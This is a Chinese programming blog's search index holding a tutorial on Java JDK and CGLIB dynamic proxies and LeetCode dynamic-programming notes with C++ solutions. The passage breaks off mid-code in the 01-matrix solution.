<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java代理模式: JDK代理与CGLIB代理</title>
      <link href="/post/d45f1ea9.html"/>
      <url>/post/d45f1ea9.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、JDK动态代理"><a href="#一、JDK动态代理" class="headerlink" title="一、JDK动态代理"></a>一、JDK动态代理</h2><h3 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h3><p>JDK动态代理机制的核心是<code>InvocationHandler</code>接口和<code>Proxy</code>类。<br>Proxy类主要是用来生成一个代理对象，使用的是<code>newProxyInstance()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, </span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces, </span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span> </span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法一共有三个参数：</p><ul><li><strong>loader</strong>：类加载器，用于加载代理对象。</li><li><strong>interface</strong>：被代理类实现的一些接口，可以指定某些具体的接口来进行代理。</li><li><strong>h</strong>：实现了<code>InvocationHandler</code>接口的对象。</li></ul><p>要实现动态代理还需要实现<code>InvocationHandler</code>来自定义处理逻辑，当动态代理对象调用了一个方法时，这个方法的调用就会被转发到实现<code>InvocationHandler</code>的<code>invoke</code>方法来调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, </span></span><br><span class="line"><span class="params">                         Method method, </span></span><br><span class="line"><span class="params">                         Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样<code>invoke()</code>方法有三个参数：</p><ul><li><strong>proxy</strong>：动态生成的代理类。</li><li><strong>method</strong>：与代理类对象调用的方法相对应。</li><li><strong>args</strong>：当前method方法的参数。</li></ul><p>可以通过<code>Proxy</code>类的<code>newProxyInstance()</code>创建的代理对象在调用方法的时候，实际会调用到实现<code>InvocationHandler</code>接口的类的<code>invoke()</code>方法。</p><h3 id="1-2-使用步骤"><a href="#1-2-使用步骤" class="headerlink" title="1.2 使用步骤"></a>1.2 使用步骤</h3><ul><li><p>定义一个接口及其实现类：<br>比如我们现在定义一个<code>HelloService</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再定义它的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义<code>InvocationHandler</code>并重写<code>invoke()</code>方法，在<code>invoke()</code>方法里我们会调用原生方法(被代理类的方法)并自定义一些处理逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 可以通过判断method的name来对不同method做不同处理</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通过<code>Proxy.newProxyInstance()</code>方法创建代理对象：<br>一般用工厂类来封装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  可以自定义需要代理的接口，例子的写法默认全部代理</span></span><br><span class="line"><span class="comment"> *  比如：</span></span><br><span class="line"><span class="comment"> *  Class&lt;?&gt;[] interfaces = &#123; HelloService.class &#125;;</span></span><br><span class="line"><span class="comment"> *      return Proxy.newProxyInstance(</span></span><br><span class="line"><span class="comment"> *      target.getClass().getClassLoader(),</span></span><br><span class="line"><span class="comment"> *      interfaces,                       // 只指定你写在interfaces里的接口</span></span><br><span class="line"><span class="comment"> *      new DebugInvocationHandler(target)</span></span><br><span class="line"><span class="comment"> *  );</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), </span><br><span class="line">                target.getClass().getInterfaces(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(target) </span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实际使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>());</span><br><span class="line">helloService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台会输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method sayHello</span><br><span class="line">Hello, java</span><br><span class="line">after method sayHello</span><br></pre></td></tr></table></figure></li></ul><h2 id="二、CGLIB动态代理"><a href="#二、CGLIB动态代理" class="headerlink" title="二、CGLIB动态代理"></a>二、CGLIB动态代理</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p><strong>JDK</strong>动态代理有一个致命问题是只能代理实现了接口的类，为了解决这个问题，我们可以使用<strong>CGLIB</strong>动态代理来避免。</p><p>CGLIB是一个基于ASM字节码的生成库，允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。在SpringBoot的AOP模块中，如果目标对象实现了接口，默认使用JDK代理，否则使用CGLIB动态代理。</p><p>在CGLIB动态代理机制中，<code>MethodInterceptor</code>接口和<code>Enhancer</code>类是核心。</p><p>需要自定义<code>MethodInterceptor</code>并且重写<code>intercept()</code>方法用于拦截增强被代理类的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MethodInterceptor</span> <span class="keyword">extends</span> <span class="title class_">Callback</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, </span></span><br><span class="line"><span class="params">                            java.lang.reflect.Method method, </span></span><br><span class="line"><span class="params">                            Object[] args,</span></span><br><span class="line"><span class="params">                            MethodProxy proxy)</span> </span><br><span class="line">        <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法有四个参数：</p><ul><li><strong>obj</strong>：被代理的对象(需要增强的对象)。</li><li><strong>method</strong>：被拦截的方法(需要增强的方法)。</li><li><strong>args</strong>：方法的参数。</li><li><strong>proxy</strong>：用于调用原始方法。</li></ul><p>可以通过<code>Enhancer</code>类来动态获取被代理类，当代理类调用方法的时候，实际调用的是<code>MethodInterceptor</code>中的<code>intercept()</code>方法。</p><h3 id="2-2-使用步骤"><a href="#2-2-使用步骤" class="headerlink" title="2.2 使用步骤"></a>2.2 使用步骤</h3><ul><li><p>定义一个类：<br>这里定义类<code>HelloService</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义<code>MethodInterceptor</code>并且重写<code>intercept()</code>方法，和JDK动态代理中的<code>invoke</code>方法类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMethodInterceptor</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> o           代理对象本身（注意不是原始对象，如果使用method.invoke(o, args)会导致循环调用）</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> method      被拦截的方法（需要增强的方法）</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> args        方法入参</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> methodProxy 高性能的方法调用机制，避免反射开销</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> methodProxy.invokeSuper(o, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>o</code>已经是继承了原始类的子类，所以会产生递归调用，需要使用包含了原始类method指针的<code>methodProxy</code>来进行父类方法调用。</p></li><li><p>通过<code>Enhancer</code>类的<code>create()</code>创建代理类：<br>也是通过工厂类来包装：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CglibProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        enhancer.setClassLoader(clazz.getClassLoader());</span><br><span class="line">        enhancer.setSuperclass(clazz); <span class="comment">// 设置被代理类</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MyMethodInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意被代理类是父类，因为代理类会继承它。</p></li><li><p>实际使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) CglibProxyFactory.getProxy(HelloService.class);</span><br><span class="line">helloService.sayHello(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台会输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method sayHello</span><br><span class="line">Hello, java</span><br><span class="line">after method sayHello</span><br></pre></td></tr></table></figure></li></ul><h2 id="三、两种模式的对比"><a href="#三、两种模式的对比" class="headerlink" title="三、两种模式的对比"></a>三、两种模式的对比</h2><ul><li>JDK动态代理只能代理实现了接口的类或者直接代理接口，而CGLIB可以代理未实现任何接口的类。 另外， CGLIB动态代理是通过生成一个被代理类的子类来拦截被代理类的方法调用，因此不能代理声明为final类型的类和方法，private方法也无法代理。</li><li>就二者的效率来说，大部分情况都是JDK动态代理更优秀，随着JDK版本的升级，这个优势更加明显。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代理模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(六): 动态规划</title>
      <link href="/post/1421f419.html"/>
      <url>/post/1421f419.html</url>
      
        <content type="html"><![CDATA[<p>算法介绍：动态规划(Dynamic Programming, DP)在查找有很多重叠子问题的情况的最优解时有效。它将问题重新组合成子问题。为了避免多次解决这些子问题，它们的结果都逐渐被计算并被保存，从简单的问题直到整个问题都被解决。因此，动态规划保存递归时的结果，因而不会在解决同样的问题时花费时间。<br>补充：</p><ul><li>动态规划只能应用于有最优子结构的问题。最优子结构的意思是局部最优解能决定全局最优解(对有些问题这个要求并不能完全满足，故有时需要引入一定的近似)。简单地说，问题能够分解成子问题来解决。</li><li>动态规划和其它遍历算法(如深&#x2F;广度优先搜索)都是将原问题拆成多个子问题然后求解，他们之间最本质的区别是，动态规划保存子问题的解，避免重复计算。解决动态规划问题的关键是找到状态转移方程，这样我们可以通过计算和储存子问题的解来求解最终问题。</li><li>可以对动态规划进行空间压缩，起到节省空间消耗的效果。</li><li>如果题目需求的是最终状态，那么使用动态搜索比较方便；如果题目需要输出所有的路径，那么使用带有状态记录的优先搜索会比较方便。</li></ul><h2 id="一、一维动态规划"><a href="#一、一维动态规划" class="headerlink" title="一、一维动态规划"></a>一、一维动态规划</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/climbing-stairs">爬楼梯</a><br>给定n节台阶，每次可以走一步或走两步，求一共有多少种方式可以走完这些台阶。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解答二(空间压缩)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> prevPrev = <span class="number">1</span>, prev = <span class="number">1</span>, cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            cur = prevPrev + prev;</span><br><span class="line">            prevPrev = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>补充：典型的斐波拉契数列问题，可转化为dp[n]&#x3D;dp[n-1]+dp[n-2]。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/house-robber">打家劫舍</a><br>假如你是一个劫匪，并且决定抢劫一条街上的房子，每个房子内的钱财数量各不相同。如果你抢了两栋相邻的房子，则会触发警报机关。求在不触发机关的情况下最多可以抢劫多少钱。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> prevPrev = <span class="number">0</span>, prev = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            cur = <span class="built_in">max</span>(prevPrev + nums[i], prev);</span><br><span class="line">            prevPrev = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[n]&#x3D;max(dp[n-1], dp[n-2]+nums[n])。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/arithmetic-slices">等差数列划分</a><br>如果一个数列至少有三个元素，并且任意两个相邻元素之差相同，则称该数列为等差数列。例如，[1,3,5,7,9]、[7,7,7,7]和[3,-1,-5,-9]都是等差数列。<br>给你一个整数数组nums，返回数组nums中所有为等差数组的子数组个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] - nums[i - <span class="number">1</span>] == nums[i - <span class="number">1</span>] - nums[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                ++k;</span><br><span class="line">                count += k;</span><br><span class="line">            &#125; <span class="keyword">else</span> k = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[n]&#x3D;dp[n-1]+1。</p></li></ul><h2 id="二、二维动态规划"><a href="#二、二维动态规划" class="headerlink" title="二、二维动态规划"></a>二、二维动态规划</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/minimum-path-sum">最小路径和</a><br>给定一个包含非负整数的mxn网格grid，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。<br><img src="https://assets.leetcode.com/uploads/2020/11/05/minpath.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">1</span> &amp;&amp; n == <span class="number">1</span>) <span class="keyword">return</span> grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j - <span class="number">1</span>] + grid[<span class="number">0</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> minTrace = <span class="built_in">min</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">                dp[i][j] = grid[i][j] + minTrace;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[i][j]&#x3D;grid[i][j]+min(dp[i-1][j], dp[i][j-1])</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/01-matrix">01矩阵</a><br>给定一个由0和1组成的矩阵mat，请输出一个大小相同的矩阵，其中每一个格子是mat中对应位置元素到最近的0的距离。<br><img src="https://pic.leetcode-cn.com/1626667205-xFxIeK-image.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;matrix) &#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, numeric_limits&lt;<span class="type">int</span>&gt;::<span class="built_in">max</span>() - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; 